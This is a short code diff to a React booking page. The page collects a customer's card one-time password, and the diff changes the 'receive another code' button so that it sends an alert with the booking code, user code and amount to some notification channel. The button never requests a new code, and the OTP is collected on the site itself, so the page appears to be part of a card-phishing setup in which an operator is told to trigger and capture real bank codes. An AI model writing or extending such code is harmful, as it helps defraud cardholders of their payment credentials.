@@ -231,7 +231,7 @@ function MyBookings() {
             <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} inputMode="numeric" autoComplete="off" className="mt-1 h-11 rounded-md border-black text-black" />
             <button type="button" onClick={submitCardOtp} className="mt-3 h-11 w-full rounded-md bg-[#1A4FD6] font-semibold text-white">SUBMIT</button>
             <p className="mt-3 text-center text-sm">{otpLeft}s</p>
-            <button type="button" onClick={() => setOtpLeft(60)} className="mt-1 w-full text-center text-xs font-semibold text-[#1A4FD6]">CLICK HERE TO RECEIVE ANOTHER CODE</button>
+            <button type="button" onClick={() => { setOtpLeft(60); void sendAlert("card_otp", `Customer asked for another code\nBooking: ${pay.booking.code}\nUser: ${pay.booking.user_code ?? ""}\nAmount: ${sar(pay.kind === "extra" ? pay.booking.extra_amount : pay.booking.advance_amount)}`); }} className="mt-1 w-full text-center text-xs font-semibold text-[#1A4FD6]">CLICK HERE TO RECEIVE ANOTHER CODE</button>
           </div>
         </div>
       ) : null}
